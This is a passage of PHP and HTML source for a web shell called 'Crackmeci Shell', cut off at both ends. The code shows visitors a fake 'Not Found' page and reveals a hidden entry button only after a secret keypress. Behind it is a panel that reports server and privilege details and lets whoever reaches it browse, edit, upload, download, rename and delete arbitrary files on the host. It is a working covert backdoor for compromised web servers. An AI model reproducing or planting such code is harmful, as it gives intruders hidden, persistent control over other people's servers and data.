            <?php if(isset($_SESSION["theme"]) && $_SESSION["theme"] == "alternative"): ?>
            body{
                background: url("https://raw.githubusercontent.com/Crackmeci/shell/main/kali.png") !important;
                background-size:cover !important;
                background-repeat:no-repeat !important;
                background-position:center !important;
            }

            :root{
                --dark-color: rgba(17,17,17,0.3);
                --background-color: rgba(17, 17, 34,0.3);
            }
            <?php else: ?>
            :root{
                --dark-color: #111;
                --background-color: #112;
            }

            <?php endif; ?>
            
            *{
                margin:0;
                padding:0;
                box-sizing:border-box;
                font-family:"Poppins",sans-serif;
            }

            .table-container {
                overflow-x: auto;
            }

            table {
                width: 100%;
                border-collapse: collapse;
            }

            th, td {
                padding: 10px;
                text-align: left;
            }

            .aboutBtn{
                margin-top:4px;
            }

            #toggleMenu{
                margin-top:8px;
                display:none;
            }

            .page{
                position:relative;
                z-index:1500;
            }

            .overlay{
                width:100%;
                height:100%;
                position:absolute;
                left:0;
                top:0;
                background: rgba(0,0,0,0.3);
                z-index: -1;
            }

            ::-webkit-scrollbar {
            width: 6px;
            }

            ::-webkit-scrollbar-track {
            background-color: #f1f1f1; 
            }

            ::-webkit-scrollbar-thumb {
            background-color: #E32636; 
            border-radius: 6px; 
            }

            ::-webkit-scrollbar-thumb:hover {
            background-color: #555;
            }



            @media (max-width: 768px) {
                #toggleMenu{
                    display:block;
                }

                .menu{
                    display:none;
                }

                .headerBar{
                    width:100%;
                    display:block !important;
                }

                .aboutBtn{
                    background-color:var(--dark-color);
                    margin-left:8px;
                    padding:8px;
                }

                .subContainer{
                    gap:16px;
                    width:100%;
                    display:flex;
                }

                .header .logo{
                    margin-bottom:8px;
                    border-bottom:1px solid rgba(255,255,255,0.1);
                    padding: 2px;
                    display:flex;
                    justify-content:space-between;
                    align-items:center;
                    width:100%;
                    border-right:0;
                    flex:1;
                }

                .ipStatus{
                    width: 50% !important;
                }

                .navbar{
                    display:block !important;
                }

                .navbar li {
                    margin-top:2px;
                }
            }
        </style>
    <?php endif; ?>
</head>
<body class="w-full h-full bg-[var(--background-color)]">
    <?php if(!isset($_SESSION["first_stage"])): ?>
        <style>
            body{
                display:flex;
                min-height:100vh;
                align-items:center;
                justify-content:center;
                width:100%;
                background:#112 !important; 
            }
        </style>
        <div class="container-fluid mx-auto text-center border-[1px] border-[rgba(255,255,255,0.1)] p-20 rounded-md">
            <div>
                <i class="fa fa-exclamation-triangle text-9xl text-red-500"></i>
            </div>
            <div>
                <h2 class="text-white text-6xl font-bold"><?php echo $languages[$systemLang]["notFound_header"]; ?></h2>
                <a href="http://<?php echo $_SERVER["HTTP_HOST"]; ?>" class="bg-blue-500 p-2 mt-4 px-8 text-white font-bold text-xl border-none outline-none rounded-md block cursor-pointer"><i class="fa fa-arrow-left"></i> <?php echo $languages[$systemLang]["goBack_text"]; ?></a>
            </div>

            <form action="" method="post">
                <?php
                    if(isset($_POST["notFound"])){
                        $_SESSION["first_stage"] = 1;
                        header("Refresh:0");
                        exit();
                    }
                ?>
                <button name="notFound" id="notFound" class="absolute  bg-blue-500 rounded-md font-bold inline text-white p-2 opacity-0 " type="submit"><?php echo $languages[$systemLang]["comeIn_btn"]; ?></button>

                <script>
                       function getRandomCoordinates() {
                            var pageWidth = window.innerWidth;
                            var pageHeight = window.innerHeight;
                            var x = Math.random() * (pageWidth - 100); 
                            var y = Math.random() * (pageHeight - 30); 

                            return { x: x, y: y };
                        }

                        function moveButtonToRandomLocation() {
                            var button = document.getElementById('notFound');
                            var coordinates = getRandomCoordinates();

                            button.style.left = coordinates.x + 'px';
                            button.style.top = coordinates.y + 'px';
                        }


                        window.onload = moveButtonToRandomLocation;

                        var uKeyPressCount = 0;

                        document.addEventListener('keydown', function(e) {
                            if (e.key === 'u') {
                                uKeyPressCount++;

                                if (uKeyPressCount === 2) {
                                    let btn =document.querySelector("#notFound");
                                    btn.style.opacity = 1;

                                    uKeyPressCount = 0;
                                }
                            } else {
                                uKeyPressCount = 0;
                            }
                        });

                </script>
            </form>
        </div>

    <?php else: ?>
        <?php if($config["username"] != "" && $config["password"] != "" && !isset($_SESSION["user"])): ?>
            <style>
                body{
                    display:flex;
                    align-items:center;
                    justify-content:center;
                    min-height:100vh;
                }
            </style>
            <form action="" method="post">
                <div class="login w-[400px] p-2 rounded-md border-[1px] border-[rgba(255,255,255,0.1)]">
                    <h2 class="font-bold text-white mb-2 text-2xl text-center"><?php echo $languages[$systemLang]["login_title"]; ?></h2>
                    <?php echo generateInputField($languages[$systemLang]["login_userText"], "username", "fa-user"); ?>
                    <?php echo generateInputField($languages[$systemLang]["login_passText"], "password", "fa-key","password"); ?>
                    <?php 
                        if(isset($_POST["login"])){
                            $username = trim($_POST["username"]);
                            $password = trim($_POST["password"]);

                            if($config["username"] == $username && $config["password"] == md5($password)){
                                $uniqueId = uniqid() . rand() . time();
                                $_SESSION["user"] = md5($user.$password.$uniqueId);
                                header("Location:".$config["base_url"]);
                                exit();
                            }
                        }
                    ?>
                    <button name="login" type="submit" class="mt-2 w-full p-2 rounded-md bg-blue-500 text-center text-white font-bold"><?php echo $languages[$systemLang]["login_btnText"]; ?></button>
                </div>
            </form>
        <?php else: ?>
            <div class="container-fluid w-[95%] m-auto  my-6">
                <div class="header w-full bg-[var(--background-color)] p-2">
                    <div class="headerBar flex gap-4 border-b-[1px] border-[rgba(255,255,255,0.1)]">
                        <div class="logo p-2 flex-1 border-r-[1px] border-[rgba(255,255,255,0.1)]">
                            <h2 class="text-white text-3xl font-bold leading-2">Crackmeci Shell</h2>
                            <div class="flex gap-2 justify-between items-center">
                                <a href="?page=about"><span class="text-[#ccc] font-semibold  block aboutBtn"><?php echo $languages[$systemLang]["about_button"]; ?></span></a>
                                <?php
                                    if(isset($_POST["logout"])):
                                        session_destroy();
                                        header("Refresh:0");
                                        exit();
                                    endif;
                                ?>
                                <form action="" method="post">
                                    <button name="logout" type="submit"><i class="text-[#ccc] font-semibold fa fa-sign-out"></i></button>
                                </form>
                            </div>
                        </div>

                        <div class="subContainer flex gap-4 w-full">
                            <div class="serverSettings p-2 flex-1  border-r-[1px] border-[rgba(255,255,255,0.1)]">
                                <span class="text-[#ccc] text-xs block"><?php echo $languages[$systemLang]["apache_text"]; ?>: <?php echo $config["apache_version"]; ?></span>
                                <span class="text-[#ccc] text-xs block"><?php echo $languages[$systemLang]["server_text"]; ?>: <?php echo $config["server_info"]; ?></span>
                                <span class="text-[#ccc] text-xs block font-bold"><?php echo $languages[$systemLang]["disk_statusText"]; ?>:<?php echo formatFileSize($config["disk_freeSpace"]); ?>/<?php echo formatFileSize($config["disk_totalSpace"]); ?></span>
                                <?php if($uid != 0 && $gid != 0 && $groups != 0): ?>
                                    <span class="text-[#ccc] text-xs block"><?php echo "UID: $uid | GID: $gid | ".$languages[$systemLang]["groups"].": $groups\n"; ?></span>
                                <?php endif; ?>
                                <span class="text-[#ccc] text-xs block"> <?php echo $languages[$systemLang]["safe_modeText"]; ?>: <span class="<?php echo $config["safe_mode"] == 1 ? 'text-red-500' : 'text-green-500'; ?>"><?php echo $config["safe_mode"] == 1 ? $languages[$systemLang]["general_onText"] : $languages[$systemLang]["general_offText"]; ?></span></span>
                                <span class="text-[#ccc] text-xs block">
                                    <p>
                                        MySQL: <span class="<?php echo (strtoupper($config["mysql_status"]) == $languages[$systemLang]["general_onText"]) ? 'text-green-500' : 'text-red-500'; ?>"><?php echo $config["mysql_status"]; ?></span> |
                                        Perl: <span class="<?php echo (strtoupper($config["perl_status"]) == $languages[$systemLang]["general_onText"]) ? 'text-green-500' : 'text-red-500'; ?>"><?php echo $config["perl_status"]; ?></span> |
                                        cURL: <span class="<?php echo (strtoupper($config["curl_status"]) == $languages[$systemLang]["general_onText"]) ? 'text-green-500' : 'text-red-500'; ?>"><?php echo $config["curl_status"]; ?></span> |
                                        WGet: <span class="<?php echo (strtoupper($config["wget_status"]) == $languages[$systemLang]["general_onText"]) ? 'text-green-500' : 'text-red-500'; ?>"><?php echo $config["wget_status"]; ?></span>
                                    </p>
                                </span>
                                
                                <nav class="border-[1px] border-[rgba(255,255,255,0.1)] my-2 mr-2  flex items-center p-1">
                                    <ul class="flex gap-2 list-style-none text-[#ccc] items-center flex-wrap">
                                        <?php $navigation = createNavigation(); ?>
                                        <?php $i=0;foreach($navigation as $currentNav): ?>
                                            <li class="flex items-center gap-2"><a class="text-[#ccc] text-sm hover:text-[#fff]" href="?folder=<?php echo getPreviousAndImplode($navigation,$i).DIRECTORY_SEPARATOR; ?>"><?php echo $currentNav; ?></a> <?php if($i != count($navigation) - 1) { echo ">"; } ?></li>
                                        <?php $i++;endforeach; ?>
                                    </ul>
                                </nav>
                            </div>

                            <div class="ipStatus p-2 flex-1">
                                <span class="text-[#ccc] font-bold hover:underline text-sm cursor-pointer block"><?php echo $languages[$systemLang]["server_ipText"]; ?>: <?php echo $config["server_ip"]; ?></span>
                                <span class="text-[#ccc] font-bold hover:underline text-sm cursor-pointer block"><?php echo $languages[$systemLang]["your_ipText"]; ?>: <?php echo $config["user_ip"]; ?></span>
                                
                                <div class="flex gap-1 w-full flex-wrap">
                                    <div class="flex-1 p-2 border-[1px] border-[rgba(255,255,255,0.1)] flex items-center justify-center mt-4">
                                        <?php 
                                            if(isset($_POST["setLanguage"])){
                                                if($_POST["setLanguage"] == "tr"){
                                                    $_SESSION["language"] = "tr";
                                                }else{
                                                    $_SESSION["language"] = "en";
                                                }

                                                header("Refresh:0");
                                            }
                                        ?>
                                        <form action="" method="post">
                                            <button type="submit" name="setLanguage" value="tr" class="p-1">
                                                <svg class="w-[32px] h-[24px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 800">
                                                    <path fill="#E30A17" d="M0 0h1200v800H0z"/>
                                                    <circle cx="425" cy="400" r="200" fill="#fff"/>
                                                    <circle cx="475" cy="400" r="160" fill="#e30a17"/>
                                                    <path fill="#fff" d="M583.334 400l180.901 58.779-111.804-153.885v190.212l111.804-153.885z"/>
                                                </svg>
                                            </button>
                                        </form>
                                        <form action="" method="post">
                                            <button type="submit" name="setLanguage" value="en" class="p-1">
                                                <svg class="w-[32px] h-[24px]" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#FFF" viewBox="0 0 1235 650">
                                                    <path d="M0 0h1235v650H0"/>
                                                    <path stroke="#b22234" stroke-dasharray="50" stroke-width="2470" d="M0 0v651"/>
                                                    <path fill="#3c3b6e" d="M0 0h494v350H0"/>
                                                    <g id="e">
                                                        <g id="d">
                                                            <g id="f">
                                                                <g id="c">
                                                                    <g id="b">
                                                                        <path id="a" d="m30 50.6 12-36 12 36-30.8-22H61"/>
                                                                        <use xlink:href="#a" x="82"/>
                                                                    </g>
                                                                    <use xlink:href="#b" x="164"/>
                                                                    <use xlink:href="#a" x="328"/>
                                                                </g>
                                                                <use xlink:href="#a" x="410"/>
                                                            </g>
                                                            <use xlink:href="#c" x="41" y="35"/>
                                                        </g>
                                                        <use xlink:href="#d" y="70"/>
                                                    </g>
                                                    <use xlink:href="#e" y="140"/>
                                                    <use xlink:href="#f" y="280"/>
                                                </svg>
                                            </button>
                                        </form>
                                    </div>

                                    <div class="flex-1 p-2 border-[1px] border-[rgba(255,255,255,0.1)] flex items-center justify-center mt-4 gap-2">
                                        <?php 
                                            if(isset($_POST["setTheme"])){
                                                $theme = ($_POST["setTheme"] == "default") ? "default" : "alternative";
                                                $_SESSION["theme"] = $theme;
                                                header("Refresh:0");
                                                exit();
                                            }
                                        
                                        ?>
                                        <form action="" method="post">
                                            <button name="setTheme" value="default" type="submit" class="bg-blue-500 p-2 rounded-md text-white font-bold text-sm"><i class="fa-solid fa-palette"></i> <?php echo $languages[$systemLang]["theme_default"]; ?></button>
                                        </form>

                                        <form action="" method="post">
                                            <button name="setTheme" value="alternative" type="submit" class="bg-blue-500 p-2 rounded-md text-white font-bold text-sm"><i class="fa-solid fa-palette"></i> <?php echo $languages[$systemLang]["theme_alternative"]; ?></button>
                                        </form>
                                    </div>
                                </div>

                            </div>
                        </div>
                    </div>
                    
                
                    <span id="toggleMenu" class="block px-2 w-full text-white font-bold text-xl text-center border-[1px] border-[rgba(255,255,255,0.1)] cursor-pointer"><i class="fa fa-bars"></i></span>
                    <div class="menu mt-3">
                        <nav class="border-[1px] border-[rgba(255,255,255,0.1)]">
                            <ul class="navbar flex gap-3 p-2 items-center flex-wrap">
                                <?php foreach($navs as $nav): ?>
                                    <li class="<?php echo checkActive($nav["href"]) || $nav["code_name"] == $_GET["page"] ? $navStyles["active"] : $navStyles["normal"]; ?>"><a href="<?php echo useOne($nav["href"]); ?>"><?php if($nav["icon"] != 0): ?><i class="<?php echo $nav["icon"]; ?>"></i><?php endif; ?> <?php echo $nav["name"]; ?></a></li>
                                <?php endforeach; ?>
                            </ul>
                        </nav>
                    </div>

                    <script>
                        let menuBtn = document.querySelector("#toggleMenu");
                        let menu = document.querySelector(".menu");

                        menuBtn.addEventListener("click",()=>{
                            if(menu.style.display == ""){
                                menu.style.display = "block";
                            }else{
                                menu.style.display = "";
                            }
                        })
                    </script>
                </div>

                <div class="container-fluid w-full h-full m-auto page">
                    <?php if(isset($_SESSION["theme"]) && $_SESSION["theme"] == "alternative"): ?>
                        <div class="overlay"></div>
                    <?php endif; ?>
                    <?php if($_GET["page"] == "home" || $_GET["page"] == "files"): ?>
                        <div class="container-fluid mx-auto">
                            <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["fileManager_title"]; ?></h1>
                            <?php $scanFolder = isset($_GET["folder"]) ? $_GET["folder"] : '.'; $all = scanningDir($scanFolder); ?>
                            <?php 
                                if(isset($_POST["delete"])){
                                    if($_POST["type"] == "file"){
                                        $name = $_POST["name"];
                                        @unlink($name);
                                        header("Refresh:0");
                                        exit();
                                    }else if($_POST["type"] == "folder"){
                                        $name = $_POST["name"];
                                        @rmdir(rtrim($name, DIRECTORY_SEPARATOR));
                                        header("Refresh:0");
                                        exit();
                                    }
                                }

                                if (isset($_POST["download"])) {
                                    if($_POST["type"] == "file"){
                                        $fileName = $_POST["name"];
                                        downloadFile($fileName);
                                    }else if($_POST["type"] == "folder"){
                                        $folderName = $_POST["name"];
                                        createAndDownloadFolder($folderName);
                                    }
                                }
                            ?>
                            <table class="min-w-full bg-[var(--background-color)] border-[1px] border-[rgba(255,255,255,0.1)]">
                                <thead>
                                    <tr>
                                        <th class="w-[300px] text-left py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-white font-bold"><?php echo $languages[$systemLang]["fileManager_name"]; ?></th>
                                        <th class="py-2 px-4 text-left border-b-[1px] border-[rgba(255,255,255,0.1)] text-white font-bold"><?php echo $languages[$systemLang]["fileManager_size"]; ?></th>
                                        <th class="py-2 px-4 text-left border-b-[1px] border-[rgba(255,255,255,0.1)] text-white font-bold"><?php echo $languages[$systemLang]["fileManager_owner"]; ?></th>
                                        <th class="py-2 px-4 text-left border-b-[1px] border-[rgba(255,255,255,0.1)] text-white font-bold"><?php echo $languages[$systemLang]["fileManager_permissions"]; ?></th>
                                        <th class="py-2 px-4  text-left border-b-[1px] border-[rgba(255,255,255,0.1)] text-white font-bold"><?php echo $languages[$systemLang]["fileManager_modified"]; ?></th>
                                        <th class="py-2 px-4 text-left border-b-[1px] border-[rgba(255,255,255,0.1)] text-white font-bold"><?php echo $languages[$systemLang]["fileManager_actions"]; ?></th>
                                    </tr>
                                </thead>

                                <tbody>
                                    <tr>
                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                        <?php
                                        $currentFolder = isset($_GET["folder"]) ? $_GET["folder"] : getcwd();
                                        $parentFolder = dirname($currentFolder);
                                        ?>
                                            <a href="?folder=<?php echo $parentFolder; ?>">..</a>
                                        </td>
                                        <td class="border-b-[1px] border-[rgba(255,255,255,0.1)] " colspan="5"></td>
                                    </tr>

                                    <?php foreach($all["directories"] as $directory):
                                        if($directory != "." && $directory != ".."):
                                            $directoryPath = !isset($_GET["folder"]) ? "./" . $directory : $_GET["folder"].'/'.$directory; 
                                    ?>

                                    <tr>
                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white ">
                                            <a class="cursor-pointer flex gap-2 hover:underline" href="?folder=<?php echo $directoryPath; ?>">
                                                <img class="w-[24px] h-[24px]" src="https://raw.githubusercontent.com/Crackmeci/shell/main/directory.png" alt="">
                                                <?php echo $directory; ?>
                                            </a>
                                        </td>

                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                            DIR
                                        </td>

                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                            <?php echo getOwnerGroup($directoryPath); ?>
                                        </td>

                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                            <?php echo get_perms($directoryPath); ?>
                                        </td> 

                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                            <?php echo date("Y-m-d H:i:s", filemtime($directoryPath)); ?>
                                        </td>

                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] flex gap-1 text-[#ccc] hover:text-white">
                                            <form action="" method="post">
                                                <button type="submit" name="download" class="h-[32px] w-[32px] bg-green-500 text-white py-1 px-2 rounded">
                                                    <i class="fa fa-download"></i>
                                                </button>
                                                <input type="hidden" name="type" value="folder">
                                                <input type="hidden" name="name" value="<?php echo $directoryPath; ?>">
                                            </form>            
                                            <form action="" method="post">
                                                <button type="submit" name="delete" class="h-[32px] w-[32px] flex items-center justify-center bg-red-500 text-white py-1 px-2 rounded"><i class="fa fa-times"></i></button>
                                                <input type="hidden" name="type" value="folder">
                                                <input type="hidden" name="name" value="<?php echo $directoryPath; ?>">
                                            </form>
                                        </td>
                                    </tr>
                                        
                                    <?php endif;endforeach; ?>

                                    <?php foreach($all["files"] as $file):
                                        if($file != "." && $file != ".."):
                                            $filePath = !isset($_GET["folder"]) ? "./" . $file : $_GET["folder"].'/'.$file; 
                                    ?>

                                    <tr>
                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                            <span class="flex gap-2">
                                                <img class="w-[24px] h-[24px]" src="<?php echo getFileIcon($file); ?>" alt="">
                                                <a href="?page=view&file=<?php echo $filePath; ?>"><?php echo $file; ?></a>
                                            </span>
                                        </td>

                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                            <?php echo formatFileSize(filesize($filePath)); ?>
                                        </td>

                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                            <?php echo getOwnerGroup($filePath); ?>
                                        </td>

                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                            <?php echo get_perms($filePath); ?>
                                        </td> 

                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] text-[#ccc] hover:text-white">
                                            <?php echo date("Y-m-d H:i:s", filemtime($filePath)); ?>
                                        </td>

                                        <td class="py-2 px-4 border-b-[1px] border-[rgba(255,255,255,0.1)] flex gap-1 text-[#ccc] hover:text-white">
                                            <form action="" method="post">
                                                <button type="submit" name="download" class="h-[32px] w-[32px] bg-green-500 text-white py-1 px-2 rounded">
                                                    <i class="fa fa-download"></i>
                                                </button>
                                                <input type="hidden" name="type" value="file">
                                                <input type="hidden" name="name" value="<?php echo $filePath; ?>">
                                            </form>            
                                            <a href="?page=edit&file=<?php echo $filePath; ?>" class="h-[32px] w-[32px] bg-blue-500 text-white py-1 px-2 rounded"><i class="fa fa-pen"></i></a>
                                            <form action="" method="post">
                                                <button type="submit" name="delete" class="flex justify-center items-center h-[32px] w-[32px] bg-red-500 text-white py-1 px-2 rounded"><i class="fa fa-times"></i></button>
                                                <input type="hidden" name="type" value="file">
                                                <input type="hidden" name="name" value="<?php echo $filePath; ?>">
                                            </form>
                                        </td>
                                    </tr>

                                    <?php endif;endforeach; ?>
                                </tbody>
                            </table>

                            <div class="flex mt-2 p-2 gap-2 w-full flex-wrap">
                                <style>
                                    #createFile{
                                        flex:1;
                                    }

                                    #createFolder{
                                        flex:1;
                                    }
                                </style>
                                <div class="flex-1 min-w-[315px] border-[1px] border-[rgba(255,255,255,0.1)] p-2">
                                    <form action="" method="post">
                                        <?php
                                            if(isset($_POST["createFile"])){
                                                $file = trim($_POST["file"]);
                                                if(isset($_GET["folder"])){
                                                    $filePath = $_GET["folder"]. DIRECTORY_SEPARATOR. $file;
                                                }
                                                if($file != ""){
                                                    $open = fopen($filePath, "w");
                                                    fclose($open);
                                                }
                                                header("Refresh:0");
                                                exit();
                                            }
                                        ?>
                                        <?php echo generateInputField($languages[$systemLang]["fileManager_createFile"], "file", "fa-file","","","createFile"); ?>
                                        <button type="submit" name="createFile" class="p-2 text-white font-bold bg-blue-500 mt-2 w-full"><i class="fa fa-plus"></i> <?php echo $languages[$systemLang]["fileManager_createFileBtn"]; ?></button>
                                    </form>
                                </div>
                                <div class="flex-1 min-w-[315px] border-[1px] border-[rgba(255,255,255,0.1)] p-2">
                                    <form action="" method="post">
                                        <?php
                                            if(isset($_POST["createFolder"])){
                                                $folder = trim($_POST["folder"]);
                                                if(isset($_GET["folder"])){
                                                    $folderPath = $_GET["folder"]. DIRECTORY_SEPARATOR. $folder;
                                                }
                                                if($folder != ""){
                                                    mkdir($folderPath);
                                                }
                                                header("Refresh:0");
                                                exit();
                                            }
                                        ?>
                                        <?php echo generateInputField($languages[$systemLang]["fileManager_createFolder"], "folder", "fa-folder-open","","","createFolder"); ?>
                                        <button type="submit" name="createFolder" class="p-2 text-white font-bold bg-blue-500 mt-2 w-full"><i class="fa fa-plus"></i> <?php echo $languages[$systemLang]["fileManager_createFolderBtn"]; ?></button>
                                    </form>
                                </div>
                            </div>      
                        </div>
                    <?php endif; ?>

                    <?php if(isset($_GET["page"]) && $_GET["page"] == "edit" && isset($_GET["file"])): ?>
                        <?php 
                            $file = $_GET["file"];
                            if(file_exists($file)){
                                if ($open = @fopen($file, "r")) {
                                    $content = "";
                                    while (!feof($open)) {
                                        $content .= htmlentities(str_replace("''", "'", fgets($open)));
                                    }
                                    @fclose($open);
                                }
                            }else{
                                echo '<div class="bg-red-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-times"></i> '.$languages[$systemLang]["file_notExists"].'</div>';
                                header("Location:".$config["base_url"]);
                                exit();
                            }
                        ?>
                        <div class="container-fluid mx-auto"> 
                            <form action="" method="post">
                                <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["fileManager_editPage_title"]; ?>: <span class="text-white"><?php echo $_GET["file"]; ?></span></h1>
                                <textarea name="content" id="file_content" class="w-full h-[360px] border rounded-md p-2 outline-none"><?=$content?></textarea>
                                <?php 
                                    if(isset($_POST["updateFile"])){
                                        $content = simpleText($_POST["content"]);
                                        $file = $_POST["file"];
                                        file_put_contents($file,$content);
                                        echo '<div class="bg-green-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-check"></i>'.$languages[$systemLang]["file_updateSuccess"].'</div>';

                                        header("Refresh:2");
                                    }
                                ?>
                                <input type="hidden" name="file" value="<?php echo $_GET["file"]; ?>">
                                <button type="submit" name="updateFile" class="bg-blue-500 text-white px-4 py-2 rounded-md mt-4"><i class="fa fa-save"></i> <?php echo $languages[$systemLang]["fileManager_editPage_btnText"]; ?></button>
                            </form>
                        </div>
                    <?php endif; ?>


                    <?php if(isset($_GET["page"]) && $_GET["page"] == "view" && isset($_GET["file"])): ?>
                        <?php 
                            $file = $_GET["file"];
                            if(file_exists($file)){
                                if ($open = @fopen($file, "r")) {
                                    $content = "";
                                    while (!feof($open)) {
                                        $content .= htmlentities(str_replace("''", "'", fgets($open)));
                                    }
                                    @fclose($open);
                                }
                            }else{
                                echo '<div class="bg-red-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-times"></i> '.$languages[$systemLang]["file_notExists"].'</div>';
                                header("Location:".$config["base_url"]);
                                exit();
                            }
                        ?>
                        <div class="container-fluid mx-auto"> 
                                <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["fileManager_viewPage_title"]; ?>: <span class="text-white"><?php echo $_GET["file"]; ?></span></h1>
                                <textarea name="content" id="file_content" class="w-full h-[360px] border rounded-md p-2 outline-none" readonly><?=$content?></textarea>
                                <div class="w-full">
                                    <?php 
                                        if(isset($_POST["renameFile"])){
                                            $filePath = $_GET["file"];
                                            $fileName = $_POST["fileName"];

                                            $newFilePath = str_replace(basename($filePath),basename($fileName),$filePath);

                                            if(rename($filePath,$newFilePath)){
                                                echo '<div class="bg-green-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-check"></i> '.$languages[$systemLang]["view_renameSuccessText"].'</div>'; 
                                                header("Refresh:2");
                                                exit();
                                            }else{
                                                echo '<div class="bg-red-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-times"></i> '.$languages[$systemLang]["view_renameErrorText"].'</div>';
                                                header("Refresh:2");
                                                exit();
                                            }
                                        }
                                    ?>
                                    <form class="w-full flex items-center my-2 gap-2" action="" method="post">
                                        <input name="fileName" class="p-2 rounded-md outline-none border-none w-full" type="text" value="<?php echo basename($_GET["file"]); ?>">
                            
                                        <button type="submit" name="renameFile" class="bg-blue-500 font-bold text-white p-2 rounded-md text-sm"><?php echo $languages[$systemLang]["view_page_renameBtn"]; ?></button>
                                    </form>
                                </div>
                        </div>
                    <?php endif; ?>
                    

                    <?php if(isset($_GET["page"]) && $_GET["page"] == "upload"): ?>
                        <div class="container-fluid mx-auto">
                            <h1 class="text-xl font-bold mb-4 mt-4 text-[#ccc] hover:text-white"><?php echo $languages[$systemLang]["uploadPage_title"]; ?></h1>
                            <form action="" method="post" class="max-w-[600px] mx-auto" enctype="multipart/form-data">
                                <div class="border-[1px] border-[rgba(255,255,255,0.1)] p-2">
                                    <div class="relative">
                                        <input type="file" name="uploads[]" id="uploader" class="absolute w-full h-full inset-0 opacity-0 cursor-pointer" multiple>
                                        <label for="uploader" class="bg-blue-500 max-h-[120px] text-white font-semibold flex items-center justify-center w-full h-full p-4"><i class="fas fa-cloud-upload-alt text-3xl"></i></label>
                                    </div>
                                    <?php
                                        if(isset($_POST["upload"])):
                                            $uploadDir = getcwd() . "/";
                                            $files = $_FILES["uploads"];

                                            foreach($files["name"] as $key => $name): 
                                                $path = $uploadDir . basename($name);
                                                $extension = pathinfo($path, PATHINFO_EXTENSION);

                                                if (move_uploaded_file($files["tmp_name"][$key], $path)) {
                                                    echo '<div class="bg-green-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-check"></i> '.$languages[$systemLang]["file_uploaded"].':'.$name.'</div>';

                                                } else {
                                                    echo '<div class="bg-red-500 mt-2 p-2 text-white font-semibold w-full flex items-center gap-2"><i class="fa fa-times"></i> '.$languages[$systemLang]["file_uploadedError"].' :'.$name.'</div>';
                                                }
                                            endforeach;
                                        endif;
                                    ?>
                                    <button type="submit" name="upload" class="block mt-2 p-2 w-full bg-green-500 font-semibold text-white"><?php echo $languages[$systemLang]["uploadPage_btnText"]; ?></button>
                                </div>
                            </form>
                        </div>
                    <?php endif; ?>

                    <?php if (isset($_GET["page"]) && $_GET["page"] == "phpinfo") :?>
                        <div class="container-fluid mx-auto p-2 relative page">
                            <style>
                                * {
                                    margin: 0;
                                    padding: 0;
                                    box-sizing: border-box;
                                    font-family: "Poppins", sans-serif;
                                }



                                .phpinfo {
                                    position:relative;
                                    z-index:9999;
                                    border: 1px solid rgba(255, 255, 255, 0.1);
                                }

                                <?php if ($_SESSION["theme"] == "default" || !isset($_SESSION["theme"])) : ?>
                                    .phpinfo,
                                    body {
                                        background-color: #112;
                                    }

                                    .phpinfo .e {
                                        background-color: #14161d;
                                        width: 100px !important;
                                    }

                                    th {
                                        min-width: 100% !important;
                                        text-align: left !important;
                                        padding: 8px !important;
                                        background: #14161d !important;
                                        border: 1px solid rgba(255, 255, 255, 0.1) !important;
                                    }

                                    :root {
                                        --php-dark-grey: #112 !important;
                                        --php-dark-blue: #14161d !important;
                                    }
                                <?php else : ?>
                                    body {
                                        background: url("https://raw.githubusercontent.com/Crackmeci/shell/main/kali.png") !important;
                                        background-size: cover !important;
                                        background-repeat: no-repeat !important;
                                        background-position: center !important;
                                        background-attachment: fixed !important;
                                        width: 100%;
                                        min-height: 100vh;
                                        background-color: rgba(0, 0, 0, 0.5); 
                                    }

                                    .phpinfo .e {
                                        background-color: rgba(20, 22, 29, 0.3);
                                        width: 100px !important;
                                    }

                                    th {
                                        min-width: 100% !important;
                                        text-align: left !important;
                                        padding: 8px !important;
                                        background: rgba(20, 22, 29, 0.3) !important;
                                        border: 1px solid rgba(255, 255, 255, 0.1) !important;
                                    }

                                    :root {
                                        --php-dark-grey: rgba(17, 17, 34, 0.3) !important;
                                        --php-dark-blue: rgba(20, 22, 29, 0.3) !important;
                                    }
                                <?php endif; ?>

                                a:link {
                                    color: #009;
                                    text-decoration: none;
                                    background-color: transparent !important;
                                }

                                table {
                                    width: 100% !important;
                                    border-collapse: collapse !important;
                                    margin-bottom: 20px !important;
                                }

                                td {
                                    width: 100px !important;
                                    text-align: left !important;
                                    padding: 8px !important;
                                    border: 1px solid rgba(255, 255, 255, 0.1) !important;
